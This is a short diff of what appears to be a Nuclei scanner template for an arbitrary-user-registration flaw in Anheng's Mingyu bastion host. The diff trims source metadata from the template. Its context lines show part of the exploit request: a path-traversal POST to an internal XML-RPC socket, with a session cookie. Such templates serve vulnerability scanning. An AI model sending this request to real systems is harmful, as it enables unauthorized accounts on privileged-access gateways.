@@ -3,14 +3,8 @@ info:
   name: 安恒明御运维审计与风险控制系统堡垒机任意用户注册
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzhufntzspg9sm1l
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uzhufntzspg9sm1l
-    fofa: 暂无
 http:
 - raw:
   - 'POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
@@ -29,8 +23,6 @@ http:
 
 
     Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
-
-
 
 
     <?xml version="1.0"?>
